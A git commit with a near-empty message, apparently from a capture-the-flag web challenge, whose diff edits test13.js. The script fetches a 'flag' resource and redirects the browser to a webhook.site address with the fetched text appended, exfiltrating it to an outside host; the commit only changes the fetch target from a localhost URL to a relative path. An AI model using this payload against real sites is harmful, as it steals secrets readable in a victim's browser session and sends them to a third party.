cecf04d01ed657277a2fa1d901cf3544805f3627
Emyr298 <emi.ru298@gmail.com>
2023-12-03 10:57:40 +0700

    s

--- test13.js
+++ test13.js
@@ -1,4 +1,4 @@
-fetch('http://127.0.0.1:14045/flag').then((res) => {
+fetch('flag').then((res) => {
     res.text().then((test) => {
         window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${encodeURIComponent(test)}`;
     }).catch((owo) => {
